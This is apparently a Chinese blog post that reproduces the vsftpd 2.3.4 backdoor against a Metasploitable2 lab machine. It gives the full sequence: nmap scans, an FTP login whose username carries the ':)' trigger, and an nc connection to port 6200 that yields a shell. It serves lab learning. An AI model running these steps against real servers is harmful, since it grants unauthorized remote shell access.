---
title: 漏洞复现(vsftpd 2.3.4)
date: 2021-11-01 16:46:34
tags: 漏洞复现
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-k96e6m.jpg
---

# 漏洞复现(vsftpd 2.3.4)

## 工具：

攻击机：kali: 192.168.118.128

靶机：Metasplotable2-Linux: 192.168.118.131

## 开始复现

打开kali终端，执行以下命令

```
nmap 192.168.118.0/24
```

![屏幕截图 2021-11-01 165841](https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-01%20165841.png)



发现靶机(192.168.118.131)打开着21端口 



```
nmap -sV 192.168.118.131
```

![image-20211101170431983](https://raw.githubusercontent.com/todis21/image/main/img/image-20211101170431983.png)



这里可以看到靶机的ftp服务的版本信息是vsftpd 2.3.4，漏洞就在这里

```
ftp 192.168.118.131 21
```

```
用户名 root:)//':)'是触发条件
密码： sssss //密码可乱来
```

![image-20211101172804027](https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172804027.png)

执行以上命令后发现靶机打开了6200端口，这就是个后门

![image-20211101172714302](https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172714302.png)

然后直接连接这个端口

```
nc 192.168.118.131 6200
```

成功连接,后门建立了shell，可以开始执行命令

![image-20211101173201531](https://raw.githubusercontent.com/todis21/image/main/img/image-20211101173201531.png)

复现结束

